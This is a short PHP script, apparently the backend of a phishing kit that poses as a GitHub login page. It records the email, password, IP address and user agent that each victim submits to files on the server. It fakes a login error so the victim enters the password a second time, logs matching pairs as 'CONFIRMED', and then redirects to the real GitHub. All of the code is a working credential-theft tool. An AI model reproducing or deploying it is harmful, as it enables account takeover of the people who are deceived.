<?php
session_start();

$platform = 'github';
$code = 'GIT';
$dir = '../../captures/' . $code;

if (!file_exists($dir)) mkdir($dir, 0755, true);

$ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
$ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
$attempt = $_POST['attempt'] ?? '1';
$email = $_POST['email'] ?? '';
$pass = $_POST['pass'] ?? '';

$file = $dir . '/GIT_' . date('Ymd_His') . '_attempt' . $attempt . '.txt';
$content = "PLATFORM: $platform\nUSERNAME/EMAIL: $email\nPASSWORD: $pass\nIP: $ip\nUA: $ua\n";
file_put_contents($file, $content, FILE_APPEND);

if ($attempt == '1') {
    $_SESSION['gh_email'] = $email;
    $_SESSION['gh_pass1'] = $pass;
    header('Location: index.html?error=1&email=' . urlencode($email));
} else {
    if ($pass === ($_SESSION['gh_pass1'] ?? '')) {
        file_put_contents($dir . '/CONFIRMED_SUMMARY.txt', 
            "✅ CONFIRMED | $email | $pass | " . date('Y-m-d H:i:s') . "\n", 
            FILE_APPEND);
    }
    session_destroy();
    header('Location: https://github.com');
}
exit;
?>